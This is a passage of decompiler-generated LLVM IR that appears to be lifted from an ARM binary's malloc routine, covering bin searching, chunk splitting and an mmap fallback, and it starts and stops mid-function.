  %v3_11b5c = udiv i32 %v1_11b40, 32
  store i32 %v3_11b5c, i32* @r5, align 4
  %v4_11b60 = mul nuw nsw i32 %v3_11b5c, 4
  %v5_11b60 = add i32 %v4_11b58, %v4_11b60
  store i32 %v5_11b60, i32* %r2.global-to-local, align 4
  %v1_11b64 = add i32 %v5_11b60, 820
  %v2_11b64 = inttoptr i32 %v1_11b64 to i32*
  %v3_11b64 = load i32, i32* %v2_11b64, align 4
  store i32 %v3_11b64, i32* @r4, align 4
  %v1_11b68 = add i32 %v4_11b58, 52
  store i32 %v1_11b68, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_11b70 = add i32 %v1_11b68, %v4_11b70.pre-phi
  store i32 %v5_11b70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11bdc, %dec_label_pc_11b40
  %v1_11b7c = phi i32 [ %v1_11b7c.pre, %dec_label_pc_11bdc ], [ %v3_11b64, %dec_label_pc_11b40 ]
  %v0_11b7c = phi i32 [ %v0_11b74.pre, %dec_label_pc_11bdc ], [ %v6_11b50, %dec_label_pc_11b40 ]
  %v1_11b74 = sub i32 1, %v0_11b7c
  %v2_11b74 = icmp ult i32 %v0_11b7c, 2
  %v1_11b74. = select i1 %v2_11b74, i32 %v1_11b74, i32 0
  store i32 %v1_11b74., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_11b7c, %v1_11b7c
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_11b74
  %v5_11b80 = or i32 %v1_11b74., 1
  store i32 %v5_11b80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11b8c.preheader

bb145:                                            ; preds = %dec_label_pc_11b74
  %v2_11b84 = icmp eq i32 %v1_11b74., 0
  br i1 %v2_11b84, label %.dec_label_pc_11bc8.preheader_crit_edge, label %dec_label_pc_11b8c.preheader

.dec_label_pc_11bc8.preheader_crit_edge:          ; preds = %bb145
  %v0_11bc057.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bc8.preheader

dec_label_pc_11b8c.preheader:                     ; preds = %bb145, %.thread15
  %v0_11b8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11b8c.preheader, %dec_label_pc_11b98
  %v0_11b8c = phi i32 [ %v0_11b8c.pre, %dec_label_pc_11b8c.preheader ], [ %v1_11b8c, %dec_label_pc_11b98 ]
  %v1_11b8c = add i32 %v0_11b8c, 1
  store i32 %v1_11b8c, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_11b8c, 2
  br i1 %tmp211, label %dec_label_pc_11c6c.loopexit, label %dec_label_pc_11b98

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b8c
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r3.global-to-local, align 4
  %v1_11b9c = load i32, i32* @r8, align 4
  %v2_11b9c = add i32 %v1_11b9c, ptrtoint (i32* @global_var_214b8.340 to i32)
  %v3_11b9c = inttoptr i32 %v2_11b9c to i32*
  %v4_11b9c = load i32, i32* %v3_11b9c, align 4
  store i32 %v4_11b9c, i32* %r2.global-to-local, align 4
  %v4_11ba0 = mul i32 %v1_11b8c, 4
  %v5_11ba0 = add i32 %v4_11b9c, %v4_11ba0
  store i32 %v5_11ba0, i32* %r3.global-to-local, align 4
  %v1_11ba4 = add i32 %v5_11ba0, 820
  %v2_11ba4 = inttoptr i32 %v1_11ba4 to i32*
  %v3_11ba4 = load i32, i32* %v2_11ba4, align 4
  store i32 %v3_11ba4, i32* @r4, align 4
  %v2_11ba8 = icmp eq i32 %v3_11ba4, 0
  br i1 %v2_11ba8, label %dec_label_pc_11b8c, label %dec_label_pc_11bb0

dec_label_pc_11bb0:                               ; preds = %dec_label_pc_11b98
  %v4_11bb0 = mul i32 %v1_11b8c, 256
  %v5_11bb0 = add i32 %v4_11b9c, %v4_11bb0
  store i32 %v5_11bb0, i32* %r3.global-to-local, align 4
  %v1_11bb4 = add i32 %v5_11bb0, 44
  store i32 %v1_11bb4, i32* %r0.global-to-local, align 4
  %v0_11bb8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11bb8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11bc8.preheader

dec_label_pc_11bc8.preheader:                     ; preds = %.dec_label_pc_11bc8.preheader_crit_edge, %dec_label_pc_11bb0
  %v0_11bc057 = phi i32 [ %v1_11bb4, %dec_label_pc_11bb0 ], [ %v0_11bc057.pre, %.dec_label_pc_11bc8.preheader_crit_edge ]
  %v0_11be4 = phi i32 [ %v3_11ba4, %dec_label_pc_11bb0 ], [ %v1_11b7c, %.dec_label_pc_11bc8.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11bb8, %dec_label_pc_11bb0 ], [ %v0_11b7c, %.dec_label_pc_11bc8.preheader_crit_edge ]
  %v2_11bc854 = and i32 %ip.promoted, %v0_11be4
  %v4_11bc856 = icmp eq i32 %v2_11bc854, 0
  br i1 %v4_11bc856, label %dec_label_pc_11bc0, label %dec_label_pc_11bd0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bc8.preheader, %dec_label_pc_11bc0
  %v2_11bc459 = phi i32 [ %v2_11bc4, %dec_label_pc_11bc0 ], [ %ip.promoted, %dec_label_pc_11bc8.preheader ]
  %v0_11bc058 = phi i32 [ %v1_11bc0, %dec_label_pc_11bc0 ], [ %v0_11bc057, %dec_label_pc_11bc8.preheader ]
  %v1_11bc0 = add i32 %v0_11bc058, 8
  %v2_11bc4 = mul i32 %v2_11bc459, 2
  %v2_11bc8 = and i32 %v2_11bc4, %v0_11be4
  %v4_11bc8 = icmp eq i32 %v2_11bc8, 0
  br i1 %v4_11bc8, label %dec_label_pc_11bc0, label %dec_label_pc_11bc8.dec_label_pc_11bd0_crit_edge

dec_label_pc_11bc8.dec_label_pc_11bd0_crit_edge:  ; preds = %dec_label_pc_11bc0
  store i32 %v1_11bc0, i32* %r0.global-to-local, align 4
  store i32 %v2_11bc4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11bd0

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11bc8.dec_label_pc_11bd0_crit_edge, %dec_label_pc_11bc8.preheader
  %v0_11bf0 = phi i32 [ %v2_11bc4, %dec_label_pc_11bc8.dec_label_pc_11bd0_crit_edge ], [ %ip.promoted, %dec_label_pc_11bc8.preheader ]
  %v0_11c14 = phi i32 [ %v1_11bc0, %dec_label_pc_11bc8.dec_label_pc_11bd0_crit_edge ], [ %v0_11bc057, %dec_label_pc_11bc8.preheader ]
  %v1_11bd0 = add i32 %v0_11c14, 12
  %v2_11bd0 = inttoptr i32 %v1_11bd0 to i32*
  %v3_11bd0 = load i32, i32* %v2_11bd0, align 4
  store i32 %v3_11bd0, i32* @lr, align 4
  %v9_11bd4 = icmp eq i32 %v3_11bd0, %v0_11c14
  br i1 %v9_11bd4, label %dec_label_pc_11bdc, label %dec_label_pc_11bfc

dec_label_pc_11bdc:                               ; preds = %dec_label_pc_11bd0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r0.global-to-local, align 4
  %v1_11be0 = load i32, i32* @r8, align 4
  %v2_11be0 = add i32 %v1_11be0, ptrtoint (i32* @global_var_214b8.340 to i32)
  %v3_11be0 = inttoptr i32 %v2_11be0 to i32*
  %v4_11be0 = load i32, i32* %v3_11be0, align 4
  %v2_11be4 = sub i32 -1, %v0_11bf0
  %v3_11be4 = and i32 %v0_11be4, %v2_11be4
  store i32 %v3_11be4, i32* @r4, align 4
  %v1_11be8 = load i32, i32* @r5, align 4
  %v4_11be8 = mul i32 %v1_11be8, 4
  %v5_11be8 = add i32 %v4_11be8, %v4_11be0
  store i32 %v5_11be8, i32* %r3.global-to-local, align 4
  %v1_11bec = add i32 %v0_11c14, 8
  store i32 %v1_11bec, i32* %r0.global-to-local, align 4
  %v2_11bf0 = mul i32 %v0_11bf0, 2
  store i32 %v2_11bf0, i32* %ip.global-to-local, align 4
  %v2_11bf4 = add i32 %v5_11be8, 820
  %v3_11bf4 = inttoptr i32 %v2_11bf4 to i32*
  store i32 %v3_11be4, i32* %v3_11bf4, align 4
  %v0_11b74.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_11b7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11b74

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bd0
  %v1_11bfc = add i32 %v3_11bd0, 4
  %v2_11bfc = inttoptr i32 %v1_11bfc to i32*
  %v3_11bfc = load i32, i32* %v2_11bfc, align 4
  store i32 %v3_11bfc, i32* %r3.global-to-local, align 4
  %v1_11c00 = and i32 %v3_11bfc, -4
  store i32 %v1_11c00, i32* %r2.global-to-local, align 4
  %v0_11c04 = load i32, i32* @sl, align 4
  %v2_11c04 = sub i32 %v1_11c00, %v0_11c04
  store i32 %v2_11c04, i32* %ip.global-to-local, align 4
  %v1_11c08 = add i32 %v3_11bd0, 12
  %v2_11c08 = inttoptr i32 %v1_11c08 to i32*
  %v3_11c08 = load i32, i32* %v2_11c08, align 4
  store i32 %v3_11c08, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_11c04, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_11bfc
  %v6_11c10 = add i32 %v1_11c00, %v3_11bd0
  store i32 %v6_11c10, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_11bfc, %bb146
  %v2_11c14 = add i32 %v3_11c08, 8
  %v3_11c14 = inttoptr i32 %v2_11c14 to i32*
  store i32 %v0_11c14, i32* %v3_11c14, align 4
  %v0_11c18 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c18 = load i32, i32* %r0.global-to-local, align 4
  %v2_11c18 = add i32 %v1_11c18, 12
  %v3_11c18 = inttoptr i32 %v2_11c18 to i32*
  store i32 %v0_11c18, i32* %v3_11c18, align 4
  %v4_11c1c = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_11af8_crit_edge, label %dec_label_pc_11c28

.dec_label_pc_11af8_crit_edge:                    ; preds = %bb147
  %v5_11c1c = add i32 %v4_11c1c, 8
  store i32 %v5_11c1c, i32* %r4.global-to-local, align 4
  %v4_11c20 = load i32, i32* %r2.global-to-local, align 4
  %v5_11c20 = add i32 %v4_11c20, 4
  %v6_11c20 = inttoptr i32 %v5_11c20 to i32*
  %v7_11c20 = load i32, i32* %v6_11c20, align 4
  store i32 %v7_11c20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11af8

dec_label_pc_11c28:                               ; preds = %bb147
  %v1_11c28 = load i32, i32* @sl, align 4
  %v2_11c28 = add i32 %v1_11c28, %v4_11c1c
  store i32 %v2_11c28, i32* %r1.global-to-local, align 4
  %v1_11c30 = load i32, i32* @r6, align 4
  %v2_11c30 = add i32 %v1_11c30, 8
  %v3_11c30 = inttoptr i32 %v2_11c30 to i32*
  store i32 %v2_11c28, i32* %v3_11c30, align 4
  %v0_11c34 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c34 = load i32, i32* @r6, align 4
  %v2_11c34 = add i32 %v1_11c34, 12
  %v3_11c34 = inttoptr i32 %v2_11c34 to i32*
  store i32 %v0_11c34, i32* %v3_11c34, align 4
  %v0_11c38 = load i32, i32* @r6, align 4
  %v1_11c38 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c38 = add i32 %v1_11c38, 8
  %v3_11c38 = inttoptr i32 %v2_11c38 to i32*
  store i32 %v0_11c38, i32* %v3_11c38, align 4
  %v0_11c3c = load i32, i32* @r6, align 4
  %v1_11c3c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c3c = add i32 %v1_11c3c, 12
  %v3_11c3c = inttoptr i32 %v2_11c3c to i32*
  store i32 %v0_11c3c, i32* %v3_11c3c, align 4
  %tmp213 = icmp ult i32 %v1_11c28, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_11c28
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v8_11c48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v8_11c48, i32* %r3.global-to-local, align 4
  %v4_11c4c = load i32, i32* %r1.global-to-local, align 4
  %v6_11c4c = add i32 %v8_11c48, 48
  %v7_11c4c = inttoptr i32 %v6_11c4c to i32*
  store i32 %v4_11c4c, i32* %v7_11c4c, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_11c28, %bb148
  %v0_11c50 = load i32, i32* @sl, align 4
  %v1_11c50 = or i32 %v0_11c50, 1
  store i32 %v1_11c50, i32* %r2.global-to-local, align 4
  %v0_11c54 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c54 = or i32 %v0_11c54, 1
  store i32 %v1_11c54, i32* %r3.global-to-local, align 4
  %v0_11c58 = load i32, i32* @lr, align 4
  %v1_11c58 = add i32 %v0_11c58, 8
  store i32 %v1_11c58, i32* %r4.global-to-local, align 4
  %v2_11c5c = add i32 %v0_11c58, 4
  %v3_11c5c = inttoptr i32 %v2_11c5c to i32*
  store i32 %v1_11c50, i32* %v3_11c5c, align 4
  %v0_11c60 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c60 = load i32, i32* %r1.global-to-local, align 4
  %v3_11c60 = add i32 %v1_11c60, %v0_11c60
  %v4_11c60 = inttoptr i32 %v3_11c60 to i32*
  store i32 %v0_11c60, i32* %v4_11c60, align 4
  %v0_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c64 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c64 = add i32 %v1_11c64, 4
  %v3_11c64 = inttoptr i32 %v2_11c64 to i32*
  store i32 %v0_11c64, i32* %v3_11c64, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11c6c.loopexit:                      ; preds = %dec_label_pc_11b8c
  br label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c6c.loopexit, %dec_label_pc_11880, %dec_label_pc_11888
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v4_11c74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11c74, i32* @r0, align 4
  %v1_11c78 = add i32 %v4_11c74, 44
  %v2_11c78 = inttoptr i32 %v1_11c78 to i32*
  %v3_11c78 = load i32, i32* %v2_11c78, align 4
  store i32 %v3_11c78, i32* %ip.global-to-local, align 4
  %v1_11c7c = add i32 %v3_11c78, 4
  %v2_11c7c = inttoptr i32 %v1_11c7c to i32*
  %v3_11c7c = load i32, i32* %v2_11c7c, align 4
  %v0_11c80 = load i32, i32* @sl, align 4
  %v1_11c80 = add i32 %v0_11c80, 16
  store i32 %v1_11c80, i32* %r1.global-to-local, align 4
  %v1_11c84 = and i32 %v3_11c7c, -4
  store i32 %v1_11c84, i32* %r3.global-to-local, align 4
  %v3_11c88 = icmp ult i32 %v1_11c84, %v1_11c80
  br i1 %v3_11c88, label %dec_label_pc_11cb8, label %dec_label_pc_11c94

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11c6c
  %v2_11c94 = sub i32 %v1_11c84, %v0_11c80
  %v2_11c98 = add i32 %v0_11c80, %v3_11c78
  store i32 %v2_11c98, i32* %r1.global-to-local, align 4
  %v1_11c9c = or i32 %v2_11c94, 1
  store i32 %v1_11c9c, i32* %r3.global-to-local, align 4
  %v1_11ca0 = or i32 %v0_11c80, 1
  store i32 %v1_11ca0, i32* %r2.global-to-local, align 4
  %v1_11ca4 = add i32 %v3_11c78, 8
  store i32 %v1_11ca4, i32* %r4.global-to-local, align 4
  store i32 %v1_11ca0, i32* %v2_11c7c, align 4
  %v0_11cac = load i32, i32* %r1.global-to-local, align 4
  %v1_11cac = load i32, i32* @r0, align 4
  %v2_11cac = add i32 %v1_11cac, 44
  %v3_11cac = inttoptr i32 %v2_11cac to i32*
  store i32 %v0_11cac, i32* %v3_11cac, align 4
  %v0_11cb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11cb0 = add i32 %v1_11cb0, 4
  %v3_11cb0 = inttoptr i32 %v2_11cb0 to i32*
  store i32 %v0_11cb0, i32* %v3_11cb0, align 4
  br label %dec_label_pc_120c0

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11c6c
  %v1_11cb8 = inttoptr i32 %v4_11c74 to i32*
  %v2_11cb8 = load i32, i32* %v1_11cb8, align 4
  store i32 %v2_11cb8, i32* %r3.global-to-local, align 4
  %v1_11cbc = and i32 %v2_11cb8, 2
  store i32 %v1_11cbc, i32* %ip.global-to-local, align 4
  %v2_11cbc = icmp eq i32 %v1_11cbc, 0
  %v1_11cc0 = add i32 %v4_11c74, 860
  %v2_11cc0 = inttoptr i32 %v1_11cc0 to i32*
  %v3_11cc0 = load i32, i32* %v2_11cc0, align 4
  store i32 %v3_11cc0, i32* %r1.global-to-local, align 4
  br i1 %v2_11cbc, label %dec_label_pc_11cd8, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cb8
  %v0_11cc8 = call i32 @__malloc_consolidate()
  %v0_11ccc = load i32, i32* @sl, align 4
  %v1_11ccc = add i32 %v0_11ccc, -7
  store i32 %v1_11ccc, i32* @r0, align 4
  %v0_11cd0 = call i32 @malloc()
  store i32 %v0_11cd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120bc

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11cb8
  %v1_11cd8 = add i32 %v4_11c74, 844
  %v2_11cd8 = inttoptr i32 %v1_11cd8 to i32*
  %v3_11cd8 = load i32, i32* %v2_11cd8, align 4
  store i32 %v3_11cd8, i32* %r3.global-to-local, align 4
  %v3_11cdc = icmp ult i32 %v0_11c80, %v3_11cd8
  %v1_11ce0 = add i32 %v3_11cc0, -1
  store i32 %v1_11ce0, i32* %sb.global-to-local, align 4
  br i1 %v3_11cdc, label %dec_label_pc_11db4, label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cd8
  %v1_11ce8 = add i32 %v4_11c74, 852
  %v2_11ce8 = inttoptr i32 %v1_11ce8 to i32*
  %v3_11ce8 = load i32, i32* %v2_11ce8, align 4
  store i32 %v3_11ce8, i32* %r2.global-to-local, align 4
  %v1_11cec = add i32 %v4_11c74, 848
  %v2_11cec = inttoptr i32 %v1_11cec to i32*
  %v3_11cec = load i32, i32* %v2_11cec, align 4
  store i32 %v3_11cec, i32* %r3.global-to-local, align 4
  %v6_11cf4 = icmp slt i32 %v3_11cec, %v3_11ce8
  br i1 %v6_11cf4, label %dec_label_pc_11cf8, label %dec_label_pc_11db4

dec_label_pc_11cf8:                               ; preds = %dec_label_pc_11ce8
  %v1_11cf8 = add i32 %v0_11c80, 10
  %v2_11cfc = add i32 %v1_11cf8, %v3_11cc0
  store i32 %v2_11cfc, i32* %r3.global-to-local, align 4
  %v2_11d00 = sub i32 0, %v3_11cc0
  %v3_11d00 = and i32 %v2_11cfc, %v2_11d00
  store i32 %v3_11d00, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_11d00, %v0_11c80
  br i1 %tmp214, label %dec_label_pc_11d0c, label %dec_label_pc_11db4

dec_label_pc_11d0c:                               ; preds = %dec_label_pc_11cf8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11d00, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11d24 = call i32 @mmap(i32 0, i32 %v3_11d00, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11d24, i32* %r0.global-to-local, align 4
  %v7_11d28 = icmp eq i32 %v6_11d24, -1
  br i1 %v7_11d28, label %dec_label_pc_11d0c.dec_label_pc_11db4_crit_edge, label %dec_label_pc_11d30

dec_label_pc_11d0c.dec_label_pc_11db4_crit_edge:  ; preds = %dec_label_pc_11d0c
  %v1_11dd8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11db4

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d0c
  %v1_11d30 = urem i32 %v6_11d24, 8
  store i32 %v1_11d30, i32* %r2.global-to-local, align 4
  %v2_11d30 = icmp eq i32 %v1_11d30, 0
  br i1 %v2_11d30, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_11d30
  %v2_11d34 = sub nsw i32 8, %v1_11d30
  store i32 %v2_11d34, i32* %r3.global-to-local, align 4
  %v2_11d38 = load i32, i32* @r4, align 4
  %v3_11d38 = sub i32 %v2_11d38, %v2_11d34
  %v3_11d3c = add i32 %v2_11d34, %v6_11d24
  store i32 %v3_11d3c, i32* %lr.global-to-local, align 4
  %v2_11d44 = or i32 %v3_11d38, 2
  store i32 %v2_11d44, i32* %r2.global-to-local, align 4
  %v5_11d4c = inttoptr i32 %v3_11d3c to i32*
  store i32 %v2_11d34, i32* %v5_11d4c, align 4
  %v1_11d50 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d50 = load i32, i32* %lr.global-to-local, align 4
  %v3_11d50 = add i32 %v2_11d50, 4
  %v4_11d50 = inttoptr i32 %v3_11d50 to i32*
  store i32 %v1_11d50, i32* %v4_11d50, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_11d30
  store i32 %v6_11d24, i32* %lr.global-to-local, align 4
  %v1_11d4850 = load i32, i32* @r4, align 4
  %v2_11d4851 = or i32 %v1_11d4850, 2
  store i32 %v2_11d4851, i32* %r3.global-to-local, align 4
  %v3_11d54 = inttoptr i32 %v6_11d24 to i32*
  store i32 0, i32* %v3_11d54, align 4
  %v1_11d58 = load i32, i32* %r3.global-to-local, align 4
  %v2_11d58 = load i32, i32* %lr.global-to-local, align 4
  %v3_11d58 = add i32 %v2_11d58, 4
  %v4_11d58 = inttoptr i32 %v3_11d58 to i32*
  store i32 %v1_11d58, i32* %v4_11d58, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11d64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d64, i32* %ip.global-to-local, align 4
  %v1_11d68 = add i32 %v4_11d64, 848
  %v2_11d68 = inttoptr i32 %v1_11d68 to i32*
  %v3_11d68 = load i32, i32* %v2_11d68, align 4
  store i32 %v3_11d68, i32* %r3.global-to-local, align 4
  %v1_11d6c = add i32 %v4_11d64, 856
  %v2_11d6c = inttoptr i32 %v1_11d6c to i32*
  %v3_11d6c = load i32, i32* %v2_11d6c, align 4
  store i32 %v3_11d6c, i32* %r2.global-to-local, align 4
  %v1_11d70 = add i32 %v3_11d68, 1
  store i32 %v1_11d70, i32* %r3.global-to-local, align 4
  %v7_11d78 = icmp sgt i32 %v1_11d70, %v3_11d6c
  br i1 %v7_11d78, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_11d70, i32* %v2_11d6c, align 4
  %v0_11d7c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11d7c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_11d7c = phi i32 [ %v4_11d64, %.thread30 ], [ %v1_11d7c.pre, %bb150 ]
  %v0_11d7c = phi i32 [ %v1_11d70, %.thread30 ], [ %v0_11d7c.pre, %bb150 ]
  %v2_11d7c = add i32 %v1_11d7c, 848
  %v3_11d7c = inttoptr i32 %v2_11d7c to i32*
  store i32 %v0_11d7c, i32* %v3_11d7c, align 4
  %v0_11d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_11d80 = add i32 %v0_11d80, 868
  %v2_11d80 = inttoptr i32 %v1_11d80 to i32*
  %v3_11d80 = load i32, i32* %v2_11d80, align 4
  store i32 %v3_11d80, i32* %r3.global-to-local, align 4
  %v1_11d84 = add i32 %v0_11d80, 880
  %v2_11d84 = inttoptr i32 %v1_11d84 to i32*
  %v3_11d84 = load i32, i32* %v2_11d84, align 4
  store i32 %v3_11d84, i32* %r2.global-to-local, align 4
  %v0_11d88 = load i32, i32* @r4, align 4
  %v2_11d88 = add i32 %v0_11d88, %v3_11d80
  store i32 %v2_11d88, i32* %r1.global-to-local, align 4
  %v1_11d8c = add i32 %v0_11d80, 872
  %v2_11d8c = inttoptr i32 %v1_11d8c to i32*
  %v3_11d8c = load i32, i32* %v2_11d8c, align 4
  store i32 %v3_11d8c, i32* %r3.global-to-local, align 4
  %v1_11d94 = add i32 %v0_11d80, 884
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  %v3_11d94 = load i32, i32* %v2_11d94, align 4
  store i32 %v3_11d94, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_11d88, %v3_11d84
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_11d88, i32* %v2_11d84, align 4
  %v0_11d9c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11d9c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_11d9c = phi i32 [ %v0_11d80, %bb151 ], [ %v1_11d9c.pre, %bb152 ]
  %v0_11d9c = phi i32 [ %v2_11d88, %bb151 ], [ %v0_11d9c.pre, %bb152 ]
  %v2_11d9c = add i32 %v1_11d9c, 868
  %v3_11d9c = inttoptr i32 %v2_11d9c to i32*
  store i32 %v0_11d9c, i32* %v3_11d9c, align 4
  %v0_11da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11da0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11da0 = add i32 %v1_11da0, %v0_11da0
  store i32 %v2_11da0, i32* %r1.global-to-local, align 4
  %v1_11da4 = load i32, i32* %r2.global-to-local, align 4
  %v0_11da8 = load i32, i32* %lr.global-to-local, align 4
  %v1_11da8 = add i32 %v0_11da8, 8
  store i32 %v1_11da8, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_11da0, %v1_11da4
  br i1 %tmp216, label %bb154, label %dec_label_pc_120bc

bb154:                                            ; preds = %bb153
  %v5_11dac = load i32, i32* %ip.global-to-local, align 4
  %v6_11dac = add i32 %v5_11dac, 884
  %v7_11dac = inttoptr i32 %v6_11dac to i32*
  store i32 %v2_11da0, i32* %v7_11dac, align 4
  br label %dec_label_pc_120bc

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11cf8, %dec_label_pc_11cd8, %dec_label_pc_11d0c.dec_label_pc_11db4_crit_edge, %dec_label_pc_11ce8
  %v1_11dd8 = phi i32 [ %v1_11dd8.pre, %dec_label_pc_11d0c.dec_label_pc_11db4_crit_edge ], [ %v0_11c80, %dec_label_pc_11ce8 ], [ %v0_11c80, %dec_label_pc_11cd8 ], [ %v0_11c80, %dec_label_pc_11cf8 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v4_11dbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11dbc, i32* %r3.global-to-local, align 4
  %v1_11dc0 = add i32 %v4_11dbc, 44
  %v2_11dc0 = inttoptr i32 %v1_11dc0 to i32*
  %v3_11dc0 = load i32, i32* %v2_11dc0, align 4
  store i32 %v3_11dc0, i32* %r0.global-to-local, align 4
  %v1_11dc4 = add i32 %v4_11dbc, 864
  %v2_11dc4 = inttoptr i32 %v1_11dc4 to i32*
  %v3_11dc4 = load i32, i32* %v2_11dc4, align 4
  store i32 %v3_11dc4, i32* %r2.global-to-local, align 4
  %v1_11dc8 = add i32 %v4_11dbc, 840
  %v2_11dc8 = inttoptr i32 %v1_11dc8 to i32*
  %v3_11dc8 = load i32, i32* %v2_11dc8, align 4
  store i32 %v3_11dc8, i32* %r3.global-to-local, align 4
  %v1_11dcc = add i32 %v3_11dc0, 4
  %v2_11dcc = inttoptr i32 %v1_11dcc to i32*
  %v3_11dcc = load i32, i32* %v2_11dcc, align 4
  store i32 %v3_11dcc, i32* %r1.global-to-local, align 4
  %v1_11dd4 = urem i32 %v3_11dc4, 2
  %v2_11dd4 = icmp eq i32 %v1_11dd4, 0
  %v1_11dd0 = add i32 %v1_11dd8, 16
  %v2_11dd8 = add i32 %v1_11dd0, %v3_11dc8
  store i32 %v2_11dd8, i32* %r3.global-to-local, align 4
  %v1_11ddc = and i32 %v3_11dcc, -4
  store i32 %v1_11ddc, i32* @r8, align 4
  br i1 %v2_11dd4, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_11db4
  %v3_11de0 = sub i32 %v2_11dd8, %v1_11ddc
  store i32 %v3_11de0, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_11db4, %bb155
  %v0_11de4 = phi i32 [ %v2_11dd8, %dec_label_pc_11db4 ], [ %v3_11de0, %bb155 ]
  %v1_11de4 = load i32, i32* %sb.global-to-local, align 4
  %v2_11de4 = add i32 %v1_11de4, %v0_11de4
  store i32 %v2_11de4, i32* %r3.global-to-local, align 4
